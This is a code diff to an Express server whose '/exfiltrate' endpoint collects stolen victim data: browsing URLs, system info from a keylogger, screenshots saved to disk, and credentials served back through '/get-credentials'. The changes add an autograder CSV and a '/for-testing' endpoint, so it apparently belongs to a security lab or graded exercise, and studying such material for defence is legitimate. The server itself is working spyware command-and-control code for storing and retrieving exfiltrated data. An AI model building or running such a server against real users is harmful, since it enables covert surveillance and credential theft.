@@ -32,7 +32,7 @@ app.post('/exfiltrate', (req, res) => {
     switch (type) {
         case 'urls':
             const url = data;
-//            console.log("Received URL:", url);
+            console.log("Received URL:", url);
             links.push({
               url: url,
               receivedAt: new Date()
@@ -42,7 +42,13 @@ app.post('/exfiltrate', (req, res) => {
             const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
             const filePath = path.join(__dirname, "csv/urls/urls.csv");
             fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
+
+            const autograderFilePath = path.join(__dirname, "csv/urls/autograder_links.csv");
+            const autograderContent = links.map(link => link.url).join(",");
+            fs.writeFileSync(autograderFilePath, autograderContent, "utf8");
+
             break;
+
         case 'os':
             console.log("Keylogger updated");
             system_info = data;
@@ -91,7 +97,7 @@ app.post('/exfiltrate', (req, res) => {
 
        case 'screenshot':
             const base64Data = data.replace(/^data:image\/png;base64,/, "");
-            const ss_path = path.join(__dirname, "csv/images", `screenshot_${Date.now()}.png`);
+            const ss_path = path.join(__dirname, "/csv/images", `screenshot_${Date.now()}.png`);
 
             fs.writeFile(ss_path, base64Data, "base64", (err) => {
                 if (err) {
@@ -102,7 +108,6 @@ app.post('/exfiltrate', (req, res) => {
 
             });
             break;
-
 
 
 //        default:
@@ -126,6 +131,14 @@ app.get('/get-urls', (req, res) => {
     res.json(links);
 });
 
+app.get('/for-testing', (req, res) => {
+    try {
+        const fileContent = fs.readFileSync(path.join(__dirname, "csv/urls/autograder_links.csv"), "utf8");
+        res.send(fileContent);
+    } catch (error) {
+        res.send('');
+    }
+});
 
 app.get('/get-os', (req, res) => {
     if (system_info)
@@ -140,10 +153,10 @@ app.get('/get-credentials', (req, res) => {
     res.json(credentials);
 });
 
-app.use("/images", express.static(path.join(__dirname, "csv/images")));
+app.use("/images", express.static(path.join(__dirname, "/csv/images")));
 
 app.get("/get-images", (req, res) => {
-    const imagesDir = path.join(__dirname, "csv/images");
+    const imagesDir = path.join(__dirname, "/csv/images");
 
     fs.readdir(imagesDir, (err, files) => {
         if (err) {
